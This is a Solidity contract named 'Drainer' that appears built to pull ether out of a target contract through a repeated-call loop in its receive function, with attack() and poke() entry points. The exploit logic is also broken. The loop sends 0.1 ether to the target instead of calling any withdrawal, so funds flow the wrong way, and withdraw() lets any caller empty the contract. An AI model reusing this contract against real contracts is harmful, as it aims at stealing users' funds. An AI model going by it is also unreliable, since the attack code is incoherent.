// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract Drainer {
    address payable public immutable target;
    uint256 public drained;

    constructor(address payable _target) {
        target = _target;
    }

    receive() external payable {
        drained += msg.value;
        while (gasleft() > 200_000 && address(target).balance >= 0.1 ether) {
            (bool ok,) = target.call{value: 0.1 ether}("");
            if (!ok) break;
        }
    }

    function poke() external payable {
        require(msg.value == 0.00001 ether, "send 0.00001 ETH");
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "poke failed");
    }

    function attack() external payable {
        require(msg.value >= 10 ether);
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "attack failed");
    }

    function withdraw() external {
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "withdraw failed");
    }
}